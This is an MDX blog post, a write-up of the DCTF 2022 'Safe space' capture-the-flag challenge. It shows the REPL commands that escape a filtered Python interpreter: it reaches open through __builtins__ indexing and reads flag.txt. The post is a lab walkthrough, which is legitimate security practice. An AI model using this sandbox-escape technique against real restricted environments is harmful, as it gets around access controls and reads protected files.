@@ -1,0 +1,96 @@
+---
+title: 'DCTF 22 - Safe space'
+date: '2022-04-16'
+description: ''
+tags:
+  - programming
+  - ctf
+  - python
+---
+
+import { BlogPost } from 'components/Blog';
+import { PageLayout } from 'components/Layout';
+
+# DCTF 22 - Safe space
+
+I recently participated in DragonSec SI's DCTF and solved this short and sweet lil Python challenge. This was the problem statement.
+
+![Problem statement](/assets/blog/dctf-safe-space/problem-statement.JPG)
+
+The challenge consisted of netcatting to the given address and upon connecting you got something that looked like this
+
+```python
+Can you find the flag?
+
+>>>
+```
+
+Considering it was tagged Python, we can assume that this is a Python REPL shell. Let's try some stuff out to see if it is.
+
+```python
+>>>1+1
+2
+>>>true
+name 'true' is not defined
+>>>True
+True
+>>>x = 1
+invalid syntax (<string>, line 1)
+>>>'a'
+Yeah no.
+>>>eval(True)
+Yeah no.
+>>>print(1)
+Yeah no.
+```
+
+Huh okay, it's definitely Python given the uppercased booleans and the syntax error, but we can't call some functions, declare variables and use strings. Let's see if we can find the flag somewhere.
+
+Python has a few functions that can help us with this: `globals()` and `locals()`, with these we can list all the variables in global and local scope respectively. Since this is in the REPL, they will probably return the same variables.
+
+```python
+Can you find the flag?
+
+>>>globals()
+name 'globals' is not defined
+```
+
+Oh. We can't access the globals, in that case, let's try `__builtins__`, this might give us some hints.
+
+```python
+>>>__builtins__
+{'open': <built-in function open>, 'print': <built-in function print>, 'list': <class 'list'>, 'FILE': 'flag.txt'}
+```
+
+pog. Looks like the functions `open`, `print`, and `list` are defined, as well as a `FILE` constant that points to a file containing the flag.
+
+```python
+>>>FILE
+flag.txt
+>>>open(FILE)
+Yeah no.
+```
+
+Alright, we can't open the file directly, let's try using the `__builtins__`, but you might notice that the `__builtins__` is a dictionary, not a list, and we're not allowed to use strings. However, we have access to `list`.
+
+```python
+>>>list(__builtins__)[0]
+open
+>>>__builtins__[list(__builtins__)[0]]
+<built-in function open>
+```
+
+Let's put this all together by converting the `__builtins__` dictionary to a list, and by using the first index, we get the name of the function we want, `open`. We can use that as the key for the `__builtins__` dictionary to access the `open` function. We can then simply call this to open the `FILE` constant, and read the flag.
+
+```python
+>>>__builtins__[list(__builtins__)[0]](FILE).read()
+dctf{bur5t_y0ur_bubbl3}
+```
+
+yosh. Flag get.
+
+export default ({ children }) => (
+  <PageLayout withBackButton>
+    <BlogPost title="hakke.ro | DCTF 22 - Safe space">{children}</BlogPost>
+  </PageLayout>
+);
